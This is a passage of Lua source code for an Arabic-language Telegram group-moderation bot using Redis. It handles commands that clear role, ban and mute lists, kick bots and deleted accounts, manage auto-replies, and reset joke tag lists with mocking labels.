Redis:del(LaRiCa.."Dev:Groups") 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المطورين*","md",true)
end
if TextMsg == 'المنشئين الاساسيين' then
if not msg.Supcreatorm then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Supcreator:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد منشئين اساسيين حاليا , ","md",true)  
end
Redis:del(LaRiCa.."Supcreator:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المنشؤين الاساسيين*","md",true)
end
if TextMsg == 'المالكين' then
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(3)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Supcreator:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مالكين حاليا , ","md",true)  
end
Redis:del(LaRiCa.."Supcreator:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المالكين*","md",true)
end
if TextMsg == 'المنشئين' then
if not msg.Supcreator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(4)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Creator:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد منشئين حاليا , ","md",true)  
end
Redis:del(LaRiCa.."Creator:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المنشئين*","md",true)
end
if TextMsg == 'المدراء' then
if not msg.Creator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(5)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Manger:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مدراء حاليا , ","md",true)  
end
Redis:del(LaRiCa.."Manger:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المدراء*","md",true)
end
if TextMsg == 'الادمنيه' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Admin:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد ادمنيه حاليا , ","md",true)  
end
Redis:del(LaRiCa.."Admin:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من الادمنيه*","md",true)
end
if TextMsg == 'المميزين' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Special:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مميزين حاليا , ","md",true)  
end
Redis:del(LaRiCa.."Special:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المميزين*","md",true)
end





----تسلية----
if TextMsg == 'الجلاب' then
local Info_Members = Redis:smembers(LaRiCa.."klb:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد جلاب حاليا , ","md",true)  
end
Redis:del(LaRiCa.."klb:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من الجلاب*","md",true)
end
if TextMsg == 'الفرخات' then
local Info_Members = Redis:smembers(LaRiCa.."kholat:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد فرخات حاليا , ","md",true)  
end
Redis:del(LaRiCa.."kholat:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من الفرخات*","md",true)
end
if TextMsg == 'القرود' then
local Info_Members = Redis:smembers(LaRiCa.."2rd:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد قرود حاليا , ","md",true)  
end
Redis:del(LaRiCa.."2rd:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من القرود*","md",true)
end
if TextMsg == 'الاغبياء' then
local Info_Members = Redis:smembers(LaRiCa.."8by:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد اغبية حاليا , ","md",true)  
end
Redis:del(LaRiCa.."8by:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من الاغبيه*","md",true)
end
if TextMsg == 'اولادي' then
local Info_Members = Redis:smembers(LaRiCa.."3ra:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد اولاد حاليا , ","md",true)  
end
Redis:del(LaRiCa.."3ra:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من اولادك*","md",true)
end
if TextMsg == 'النثيه' then
local Info_Members = Redis:smembers(LaRiCa.."smb:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد نثيهاويه حاليا , ","md",true)  
end
Redis:del(LaRiCa.."smb:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من النثيهاويه*","md",true)
end
if TextMsg == 'الحمير' then
local Info_Members = Redis:smembers(LaRiCa.."mar:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد حمير حاليا , ","md",true)  
end
Redis:del(LaRiCa.."mar:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من الحمير*","md",true)
end
if TextMsg == 'المتوحدين' then
local Info_Members = Redis:smembers(LaRiCa.."twhd:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد متوحدين حاليا , ","md",true)  
end
Redis:del(LaRiCa.."twhd:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المتوحدين*","md",true)
end
if TextMsg == 'الوتكات' then
local Info_Members = Redis:smembers(LaRiCa.."wtka:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد وتكات حاليا , ","md",true)  
end
Redis:del(LaRiCa.."wtka:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من الوتكات*","md",true)
end
----تسلية----
if TextMsg == 'المحظورين عام' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."BanAll:Groups") 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد محظورين عام حاليا , ","md",true)  
end
Redis:del(LaRiCa.."BanAll:Groups") 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المحظورين عام*","md",true)
end
if TextMsg == 'المكتومين عام' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."BanAll:Groups") 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مكتومين عام حاليا , ","md",true)  
end
Redis:del(LaRiCa.."ktmAll:Groups") 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المكتومين عام*","md",true)
end
if TextMsg == 'المحظورين' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."BanGroup:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد محظورين حاليا , ","md",true)  
end
Redis:del(LaRiCa.."BanGroup:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المحظورين*","md",true)
end
if TextMsg == 'المكتومين' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."SilentGroup:Group"..msg_chat_id) 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مكتومين حاليا , ","md",true)  
end
Redis:del(LaRiCa.."SilentGroup:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المكتومين*","md",true)
end
if TextMsg == 'المقيدين' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Recent", "*", 0, 200)
local List_Members = Info_Members.members
x = 0
for k, v in pairs(List_Members) do
if Info_Members.members[k].status.is_member == true and Info_Members.members[k].status.luatele == "chatMemberStatusRestricted" then
LuaTele.setChatMemberStatus(msg.chat_id,v.member_id.user_id,'restricted',{1,1,1,1,1,1,1,1})
x = x + 1
end
end
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..x.."} من المقيديين*","md",true)
end
if TextMsg == 'البوتات' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Bots", "*", 0, 200)
local List_Members = Info_Members.members
x = 0
for k, v in pairs(List_Members) do
local Ban_Bots = LuaTele.setChatMemberStatus(msg.chat_id,v.member_id.user_id,'banned',0)
if Ban_Bots.luatele == "ok" then
x = x + 1
end
end
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عدد البوتات الموجوده : "..#List_Members.."\n• تم طرد ( "..x.." ) بوت من الكروب*","md",true)  
end
if TextMsg == 'المطرودين' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Banned", "*", 0, 200)
x = 0
local List_Members = Info_Members.members
for k, v in pairs(List_Members) do
UNBan_Bots = LuaTele.setChatMemberStatus(msg.chat_id,v.member_id.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
if UNBan_Bots.luatele == "ok" then
x = x + 1
end
end
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عدد المطرودين في الكروب : "..#List_Members.."\n• تم الغاء الحظر عن ( "..x.." ) من الاشخاص*","md",true)  
end
if TextMsg == 'المحذوفين' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local Info_Members = LuaTele.searchChatMembers(msg_chat_id, "*", 200)
local List_Members = Info_Members.members
x = 0
for k, v in pairs(List_Members) do
local UserInfo = LuaTele.getUser(v.member_id.user_id)
if UserInfo.type.luatele == "userTypeDeleted" then
local userTypeDeleted = LuaTele.setChatMemberStatus(msg.chat_id,v.member_id.user_id,'banned',0)
if userTypeDeleted.luatele == "ok" then
x = x + 1
end
end
end
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• تم طرد ( "..x.." ) حساب محذوف*","md",true)  
end
end
if text == ("مسح الردود") then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n• هذا الامر يخص • ↤𓆩*'..Controller_Num(6)..'*𓆪',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/LaRiCab0t'}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(LaRiCa.."List:Manager"..msg_chat_id.."")
for k,v in pairs(list) do
Redis:del(LaRiCa.."Add:Rd:Manager:Gif"..v..msg_chat_id)   
Redis:del(LaRiCa.."Add:Rd:Manager:Vico"..v..msg_chat_id)   
Redis:del(LaRiCa.."Add:Rd:Manager:Stekrs"..v..msg_chat_id) 
Redis:del(LaRiCa.."Add:Rd:Manager:Text"..v..msg_chat_id)   
Redis:del(LaRiCa.."Add:Rd:Manager:Photo"..v..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Photoc"..v..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Video"..v..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Videoc"..v..msg_chat_id)  
Redis:del(LaRiCa.."Add:Rd:Manager:File"..v..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:video_note"..v..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Audio"..v..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Audioc"..v..msg_chat_id)
Redis:del(LaRiCa.."List:Manager"..msg_chat_id)
end
return LuaTele.sendText(msg_chat_id,msg_id,"• تم مسح قائمه الردود","md",true)  
end
if text == ("الردود") then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n• هذا الامر يخص • ↤𓆩*'..Controller_Num(6)..'*𓆪',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/LaRiCab0t'}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(LaRiCa.."List:Manager"..msg_chat_id.."")
text = "• قائمه الردود \n━━━━━━━━━━━━\n"
for k,v in pairs(list) do
if Redis:get(LaRiCa.."Add:Rd:Manager:Gif"..v..msg_chat_id) then
db = "متحركه •"
elseif Redis:get(LaRiCa.."Add:Rd:Manager:Vico"..v..msg_chat_id) then
db = "بصمه •"
elseif Redis:get(LaRiCa.."Add:Rd:Manager:Stekrs"..v..msg_chat_id) then
db = "ملصق •"
elseif Redis:get(LaRiCa.."Add:Rd:Manager:Text"..v..msg_chat_id) then
db = "رساله •"
elseif Redis:get(LaRiCa.."Add:Rd:Manager:Photo"..v..msg_chat_id) then
db = "صوره •"
elseif Redis:get(LaRiCa.."Add:Rd:Manager:Video"..v..msg_chat_id) then
db = "فيديو •"
elseif Redis:get(LaRiCa.."Add:Rd:Manager:File"..v..msg_chat_id) then
db = "ملف •"
elseif Redis:get(LaRiCa.."Add:Rd:Manager:Audio"..v..msg_chat_id) then
db = "اغنيه •"
elseif Redis:get(LaRiCa.."Add:Rd:Manager:video_note"..v..msg_chat_id) then
db = "بصمه فيديو •"
end
text = text..""..k.." » {"..v.."} » {"..db.."}\n"
end
if #list == 0 then
text = "• عذرا لا يوجد ردود للمدير في الكروب"
end
return LuaTele.sendText(msg_chat_id,msg_id,"["..text.."]","md",true)  
end
if text == "اضف رد" then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n• هذا الامر يخص • ↤𓆩*'..Controller_Num(6)..'*𓆪',"md",true)  
end
Redis:set(LaRiCa.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id,true)
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = 'الغاء الامر', data = msg.sender.user_id..'/cancelrdd'},},}}
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل الان الكلمه لاضافتها في الردود ","md",false, false, false, false, reply_markup)
end

if text then   
if Redis:get(LaRiCa..'Set:array'..msg.sender.user_id..':'..msg_chat_id) == 'true1' then
local test = Redis:get(LaRiCa..'Text:array'..msg.sender.user_id..':'..msg_chat_id..'')
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
Redis:sadd(LaRiCa.."Add:Rd:array:Text"..test..msg_chat_id,text)  
_key = {
{{text="اضغط هنا لانهاء الاضافه",callback_data="EndAddarray"..msg.sender.user_id}},
}
send_inlin_key(msg_chat_id,'* •  تم حفظ الرد يمكنك ارسال اخر او اكمال العمليه من خلال الزر اسفل*',_key,msg_id)
return false  
end
end    
if text and text:match("^(.*)$") then
if Redis:get(LaRiCa.."Set:array:Ssd"..msg.sender.user_id..":"..msg_chat_id) == 'dttd' then
Redis:del(LaRiCa.."Set:array:Ssd"..msg.sender.user_id..":"..msg_chat_id)
gery = Redis:get(LaRiCa.."Set:array:addpu"..msg.sender.user_id..":"..msg_chat_id)
if not Redis:sismember(LaRiCa.."Add:Rd:array:Text"..gery..msg_chat_id,text) then
LuaTele.sendText(msg_chat_id, msg_id,'* •  لا يوجد رد متعدد* ',"md",true)
return false
end
Redis:srem(LaRiCa.."Add:Rd:array:Text"..gery..msg_chat_id,text)
LuaTele.sendText(msg_chat_id, msg_id,'* •  تم حذفه بنجاح .* ',"md",true)
end
end
if text and text:match("^(.*)$") then
if Redis:get(LaRiCa.."Set:array:Ssd"..msg.sender.user_id..":"..msg_chat_id) == 'delrd' then
Redis:del(LaRiCa.."Set:array:Ssd"..msg.sender.user_id..":"..msg_chat_id)
if not Redis:sismember(LaRiCa..'List:array'..msg_chat_id,text) then
LuaTele.sendText(msg_chat_id, msg_id,'* •  لا يوجد رد متعدد* ',"md",true)
return false
end
Redis:set(LaRiCa.."Set:array:addpu"..msg.sender.user_id..":"..msg_chat_id,text)
Redis:set(LaRiCa.."Set:array:Ssd"..msg.sender.user_id..":"..msg_chat_id,"dttd")
LuaTele.sendText(msg_chat_id, msg_id,'* •  قم بارسال الرد الذي تريد حذفه منه* ',"md",true)
return false
end
end
if text == "حذف رد من متعدد" then
if not msg.Supcreatorm then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*•  هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
inlin = {
{{text = '- اضغط هنا للالغاء.',callback_data=msg.sender.user_id..":cancelRd:add"}},
}
send_inlin_key(msg_chat_id,"•  ارسل الكلمه التي تريد حذفها",inlin,msg_id)
Redis:set(LaRiCa.."Set:array:Ssd"..msg.sender.user_id..":"..msg_chat_id,"delrd")
return false 
end

if text and text:match("^(.*)$") then
if Redis:get(LaRiCa.."Set:array"..msg.sender.user_id..":"..msg_chat_id) == "true" then
Redis:set(LaRiCa.."Set:array"..msg.sender.user_id..":"..msg_chat_id,"true1")
Redis:set(LaRiCa.."Text:array"..msg.sender.user_id..":"..msg_chat_id, text)
Redis:sadd(LaRiCa.."List:array"..msg_chat_id.."", text)
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'الغاء الامر', data = msg.sender.user_id..'/cancelrdd'},
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل لي الرد لاضافته","md",false, false, false, false, reply_markup)
end
end
if text and text:match("^(.*)$") then
if Redis:get(LaRiCa.."Set:array:rd"..msg.sender.user_id..":"..msg_chat_id) == "delrd" then
Redis:set(LaRiCa.."Text:array"..msg.sender.user_id..":"..msg_chat_id, text)
Redis:del(LaRiCa.."Set:array:rd"..msg.sender.user_id..":"..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:array:Text"..text..msg_chat_id)
Redis:srem(LaRiCa..'List:array'..msg_chat_id, text)
LuaTele.sendText(msg_chat_id, msg_id,'* •  تم ازالة الرد المتعدد بنجاح* ',"md",true)
return false
end
end
if text == "حذف رد متعدد" then
inlin = {
{{text = '- اضغط هنا للالغاء.',callback_data=msg.sender.user_id..":cancelRd:add"}},
} 
Redis:set(LaRiCa.."Set:array:rd"..msg.sender.user_id..":"..msg_chat_id,"delrd")
send_inlin_key(msg_chat_id,"•  ارسل الكلمه التي تريد حذفها",inlin,msg_id)
return false 
end
if text then
if  Redis:sismember(LaRiCa..'List:array'..msg_chat_id,text) then
local list = Redis:smembers(LaRiCa.."Add:Rd:array:Text"..text..msg_chat_id)
quschen = list[math.random(#list)]
LuaTele.sendText(msg_chat_id, msg_id,'['..quschen..']',"md",true)
end
end
if text == ("الردود المتعدده") then
if not msg.Supcreatorm then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*•  هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)
end
local list = Redis:smembers(LaRiCa..'List:array'..msg_chat_id..'')
text = " •  قائمه الردود المتعدده \n•━━━━ ━━━━━•\n"
for k,v in pairs(list) do
text = text..""..k..">> ("..v..") » {رساله}\n"
end
if #list == 0 then
text = " •  لا يوجد ردود متعدده"
end
LuaTele.sendText(msg_chat_id, msg_id,'['..text..']',"md",true)
end
if text == ("مسح الردود المتعدده") then   
if not msg.Supcreatorm then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*•  هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
local list = Redis:smembers(LaRiCa..'List:array'..msg_chat_id)
for k,v in pairs(list) do
Redis:del(LaRiCa.."Add:Rd:array:Text"..v..msg_chat_id)   
Redis:del(LaRiCa..'List:array'..msg_chat_id)
end
LuaTele.sendText(msg_chat_id, msg_id,"* •  تم مسح الردود المتعدده*","md",true)
end
if text == "اضف رد متعدد" then   
if not msg.Supcreatorm then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*•  هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
inlin = {
{{text = '- اضغط هنا للالغاء.',callback_data=msg.sender.user_id.."/cancelrdd"}},
}
send_inlin_key(msg_chat_id,"ارسل الان الرد ",inlin,msg_id)
Redis:set(LaRiCa.."Set:array"..msg.sender.user_id..":"..msg_chat_id,true)
return false
end

if text == ("الردود العامه") then 
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هاذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/LaRiCaTeam'}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
